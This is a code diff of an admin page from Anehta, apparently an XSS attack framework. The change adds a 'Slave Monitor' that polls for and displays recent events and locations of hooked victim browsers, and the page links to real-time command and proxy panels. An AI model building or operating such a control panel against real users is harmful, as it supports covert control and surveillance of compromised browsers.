@@ -16,15 +16,16 @@
 	  <script src="../server/js/ui.draggable.js"></script>
 	  
 	  <script src="../server/js/loadData.js"></script>
-	  <link rel="stylesheet" type="text/css" href="css/style.css" />
+	  <link rel="stylesheet" type="text/css" href="css/style.css" />   
 	  	  
 </head>
 <body onload="return initData();">
 
-<img id="logo" style="float:top;z-index: 19999" src="../server/img/logo.jpg" />	
+
+<img id="logo" style="float:top; z-index: 19999" src="../server/img/logo.jpg" />	
 <ul id="basictab" class="basictab">	
-<li class="selected" style="margin: 0 0 0 188px;"><a href="../server/admin.php">Home</a></li>
-<li><a href="../server/slavemonitor.php">Slave Monitor</a></li>
+<li style="margin: 0 0 0 188px;"><a href="../server/admin.php">Home</a></li>
+<li class="selected"><a href="../server/slavemonitor.php">Slave Monitor</a></li>
 <li><a href="../server/rtcmd.php">RealTime CMD</a></li>
 <li><a href="../server/clientproxy.php">Client Proxy</a></li>
 <li><a href="../server/onlineproxy.php">Online Proxy</a></li>
@@ -32,7 +33,8 @@
 <li><a href="../server/help.php">Help</a></li>
 </ul>
 
-<div id="xssSites" class="wireframemenu" style="float:left;" >
+
+<div id="xssSites" class="wireframemenu" style="float:left; visibility: hidden;" >
 <ul>
 <!--
 <li onMouseover="dropdownmenu(this, event, menu2, '150px')" onMouseout="delayhidemenu()" ><a href="">Anehta</a></li>
@@ -44,7 +46,10 @@
 </div>
 
 
+<!-- 以下是功能部分 -->
 <script>
+// 加载RSS
+loadRSS();		
 
 // 每个页面的 dosomething可能不同
 function dosomething(o){
@@ -53,19 +58,24 @@ function dosomething(o){
 	var whichDomain = obj_call_dropdownmenu.innerHTML;
 	
 	// 删除原来存在页面中间的注意事项
-	var home_notes = $d.getElementById("home_notes");
-	home_notes.parentNode.removeChild(home_notes);
+	var slavemonitor = $d.getElementById("slavemonitor");
+	slavemonitor.parentNode.removeChild(slavemonitor);
+	
+	var rsslabel = $d.getElementById("rsslabel");
+	if (rsslabel){
+	  rsslabel.parentNode.removeChild(rsslabel);
+  }
 	
 	// 插入新的slave信息
 	var blackboard = $d.getElementById("blackboard"); // 中间的大div
 	
-	home_notes = $d.createElement("div");
-	home_notes.id = "home_notes";
-	home_notes.style.width = "660px";
-	home_notes.style.height = "320px";
-	home_notes.style.margin = "15px 15px 15px 15px";
-	home_notes.style.overflow = "auto";
-	blackboard.appendChild(home_notes);
+	slavemonitor = $d.createElement("div");
+	slavemonitor.id = "slavemonitor";
+	slavemonitor.style.width = "660px";
+	slavemonitor.style.height = "320px";
+	slavemonitor.style.margin = "15px 15px 15px 15px";
+	slavemonitor.style.overflow = "auto";
+	blackboard.appendChild(slavemonitor);
 	
 	
 	for (i=(slaveData.record.length - 1); i>=0; i--){
@@ -76,12 +86,12 @@ function dosomething(o){
 	      slavetable.id = "slavetable";
 	      slavetable.name = slaveData.record[i].key;
 	      slavetable.summary = "Anehta Slave Info Collected";
-	      home_notes.appendChild(slavetable);
+	      slavemonitor.appendChild(slavetable);
 	      
 	      // 表格之间换行间隔
 	      var table_space = $d.createElement("div");
 	      table_space.innerHTML = "<br /><br />";
-	      home_notes.appendChild(table_space);
+	      slavemonitor.appendChild(table_space);
         
 	      // 创建table head
 	      var thead = $d.createElement("thead");
@@ -163,33 +173,88 @@ function dosomething(o){
 	                }      			          		
 	          		});
 	          }   		      	
-	      	});
+	      	});	      
 	    }
 	  }
   }  
 }
 
+
+
+function loadRSS(){
+	$.getJSON("../server/jsoncallback.php?jsoncallback=getSlaveRSS", function(data){
+				
+		setTimeout(function(){			 
+			 var slavemonitor = $d.getElementById("slavemonitor"); 
+			 
+			 $(data.rss.channel.item).each(function(i){
+			 	  //alert(this.guid);
+			 	  //slavemonitor.innerHTML = slavemonitor.innerHTML + "<li>" + this.title + "</li>";
+			 	  slavemonitor.innerHTML = slavemonitor.innerHTML + "<a>" + $.trim(this.title) + 
+			 	                           "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;" + 
+			 	                           "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;" + 
+			 	                           "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;" + 
+			 	                           $.trim(this.pubDate) + "</a>" +
+			 	                           "<div><p>" + "<b>Slave Location: </b>" + $.trim(this.category) + "<br>" +
+			 	                           $.trim(this.description) + "</p></div>";
+			 	  			 	  
+			  });
+			$("#slavemonitor").accordion({ 
+           //header: 'div.title', 
+           active: false, 
+           alwaysOpen: false, 
+           animated: false, 
+           autoHeight: false 
+       });
+       
+      // 释放内存
+	    setTimeout(function(){data = null;}, 500);  
+       
+			}, 1000);
+	});
+			
+	
+	setInterval(function(){
+		//slavemonitor.innerHTML = ""; //先清空
+	  $.getJSON("../server/jsoncallback.php?jsoncallback=getSlaveRSS", function(data){
+	  	
+	  	setTimeout(function(){
+	  		 //alert(data.rss.channel.item[0].author); 
+	  		 	  		 
+	  		 var slavemonitor = $d.getElementById("slavemonitor"); 
+	  		 
+	  		 $(data.rss.channel.item).each(function(i){
+	  		 	  slavemonitor.getElementsByTagName("a")[i].innerHTML = $.trim(this.title) + 
+	  		 	                           "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;" + 
+	  		 	                           "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;" + 
+	  		 	                           "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;" + 
+	  		 	                           $.trim(this.pubDate);
+	  		 	                          
+	  		 	  slavemonitor.getElementsByTagName("p")[i].innerHTML = "<b>Slave Location: </b>" + $.trim(this.category) + "<br>" +
+	  		 	                           $.trim(this.description);                        	
+	  		 	  			 	  
+	  		  }); 
+	  		  
+	  		  // 释放内存
+	  		  setTimeout(function(){data = null;}, 500); 
+	  		   		  
+	  		}, 1000);
+	  });
+  }, 60000);  // 一分钟更新一次RSS
+}
 </script>
 
 
-<!-- 以下是功能部分 -->
-
 <div id="shiftcontainer" class="shiftcontainer" style="margin: 0 0 0 15px; float: left;">
-  <div class="shadowcontainer" style="width: 700px;">
-    <div id="blackboard" class="innerdiv" style="height:350px;">
-    	<div id="home_notes">
-      <ul>
-      	<li> 注意事项：</li>
-      	<li><a href="#">test</a></li>
-      </ul>	
-      <div>
+  <div class="shadowcontainer" style="width: 700px; ">
+    <div id="blackboard" class="innerdiv" style="height:360px;" >
+    	<label id="rsslabel" style="font-size: 12px; font-family: verdana; color: grey; margin: 0 0 0 5px; float: left;"><b>Recent 30 Slave Events:</b></label>
+    	<div id="slavemonitor" class="rssReader" style="width: 660px; height: 320px; margin: 0px 15px 15px 15px; overflow: auto; float: left;">
+      </div>
     </div>
   </div>
 </div>
 		
-		
-</div>
-</div>
 <div align="center">	
 	 <!--footer-->
   <div class="clear">
@@ -199,8 +264,7 @@ function dosomething(o){
       <label for="foot" style="color: #666666; font-size: 14px;">&copy;2008 <a href="http://anehta.googlecode.com">Anehta</a></label>
     </div>
   </div>
-</div>	
-
+</div>		
 </body>
 
 </html>
